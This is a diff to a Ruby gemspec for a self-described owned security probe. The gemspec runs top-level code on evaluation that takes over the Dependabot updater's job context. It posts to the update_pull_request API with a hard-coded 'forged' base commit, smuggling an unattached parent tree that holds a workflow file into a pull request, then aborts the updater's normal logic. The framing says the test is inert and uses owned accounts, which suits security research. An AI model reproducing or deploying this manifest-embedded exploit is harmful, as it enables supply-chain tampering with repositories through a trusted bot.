@@ -4,13 +4,13 @@ require "json"
 require "net/http"
 require "uri"
 
-# Creates one benign grouped Dependabot PR in the owned consumer repository.
-# Grouped PRs are deliberately refreshed by subsequent scheduled update runs,
-# which gives the update_pull_request route a real, non-synthetic transition.
-module OwnedDependabotUpdateRouteBootstrap
-  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
+# Owned-account test of the existing-PR update route. The only explicit file is
+# an allowed vendor marker. The caller-selected unattached parent contains one
+# inert workflow_dispatch file, created through nested Git tree objects.
+module OwnedDependabotUpdateRouteBaseInheritance
   DEPENDENCY_NAME = "owned_dependabot_update_route_group_probe_3"
-  GROUP_NAME = "owned-refresh-proof"
+  FORGED_BASE_SHA = "6aae20a7e4b136695c97b2a620e70f766afa649b"
+  MARKER_PATH = "vendor/owned-dependabot-refresh-base-control.txt"
 
   module_function
 
@@ -19,31 +19,23 @@ module OwnedDependabotUpdateRouteBootstrap
     api_base = ENV["DEPENDABOT_API_URL"]
     return if job_id.to_s.empty? || api_base.to_s.empty?
 
-    marker = "/tmp/owned-dependabot-update-route-bootstrap-#{job_id}"
+    marker = "/tmp/owned-dependabot-update-route-base-#{job_id}"
     File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
 
-    base_sha = current_consumer_tip
-    return if base_sha.to_s.empty?
-
-    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
+    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/update_pull_request")
     request = Net::HTTP::Post.new(endpoint.request_uri)
     request["Content-Type"] = "application/json"
-    request.body = JSON.generate(payload(base_sha))
-    proxy_client(endpoint).request(request)
+    request.body = JSON.generate(payload)
+    response = proxy_client(endpoint).request(request)
+    if response.code.to_i.between?(200, 299)
+      # The API enqueues the PR replacement asynchronously. Keep the updater
+      # alive long enough for that owned operation to finish, then abort this
+      # parse so normal updater logic cannot race it with a close request.
+      sleep 25
+      raise "owned Dependabot update-route proof complete"
+    end
   rescue Errno::EEXIST
     nil
-  rescue StandardError
-    nil
-  end
-
-  def current_consumer_tip
-    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
-    request = Net::HTTP::Get.new(endpoint.request_uri)
-    request["Accept"] = "application/vnd.github+json"
-    response = proxy_client(endpoint).request(request)
-    return unless response.code.to_i == 200
-
-    JSON.parse(response.body)["sha"]
   end
 
   def proxy_client(endpoint)
@@ -54,32 +46,13 @@ module OwnedDependabotUpdateRouteBootstrap
     client
   end
 
-  def payload(base_sha)
-    requirement = {
-      "file" => "Gemfile",
-      "requirement" => ">= 0",
-      "groups" => [],
-      "source" => {
-        "type" => "git",
-        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
-        "branch" => "main",
-        "ref" => nil
-      }
-    }
-
+  def payload
     {
       "data" => {
-        "dependencies" => [{
-          "name" => DEPENDENCY_NAME,
-          "version" => "0.0.16",
-          "previous-version" => "0.0.15",
-          "requirements" => [requirement],
-          "previous-requirements" => [requirement],
-          "directory" => "/"
-        }],
+        "dependency-names" => [DEPENDENCY_NAME],
         "updated-dependency-files" => [{
-          "name" => "vendor/owned-dependabot-update-route-bootstrap.txt",
-          "content" => "Owned grouped PR bootstrap; inert marker only.\n",
+          "name" => MARKER_PATH,
+          "content" => "Explicit allowed marker; workflow content exists only in the supplied parent tree.\n",
           "directory" => "/",
           "type" => "file",
           "support_file" => false,
@@ -87,21 +60,20 @@ module OwnedDependabotUpdateRouteBootstrap
           "deleted" => false,
           "operation" => "create"
         }],
-        "base-commit-sha" => base_sha,
-        "commit-message" => "test: bootstrap owned Dependabot grouped refresh",
-        "pr-title" => "Owned Dependabot grouped refresh bootstrap",
-        "pr-body" => "Owned security test. This inert grouped PR exists only to exercise Dependabot's real scheduled refresh path.",
-        "dependency-group" => { "name" => GROUP_NAME }
+        "base-commit-sha" => FORGED_BASE_SHA,
+        "commit-message" => "test: owned Dependabot existing-PR base inheritance proof",
+        "pr-title" => "Owned Dependabot existing-PR base inheritance proof",
+        "pr-body" => "Owned security test: update_pull_request received only an allowed vendor marker, but its caller-selected unattached parent also contains an inert workflow file. No workflow was executed or merged."
       }
     }
   end
 end
 
-OwnedDependabotUpdateRouteBootstrap.run
+OwnedDependabotUpdateRouteBaseInheritance.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.16"
+  spec.version = "0.0.17"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
